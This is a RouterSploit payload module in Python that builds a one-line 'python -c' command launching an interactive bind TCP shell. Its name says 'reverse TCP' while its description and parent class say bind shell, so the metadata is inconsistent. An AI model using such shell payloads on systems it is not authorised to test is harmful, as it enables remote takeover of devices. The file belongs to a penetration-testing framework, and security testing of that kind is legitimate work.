from routersploit.core.exploit import *
from routersploit.modules.payloads.python.bind_tcp import Exploit as PythonBindTCP


class Exploit(PythonBindTCP):
    __info__ = {
        "name": "Python Reverse TCP One-Liner",
        "description": "Creates interactive tcp bind shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>"  # routersploit module
        ),
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        payload = super(Exploit, self).generate()

        cmd = '{} -c "{}"'.format(self.cmd, payload)
        return cmd
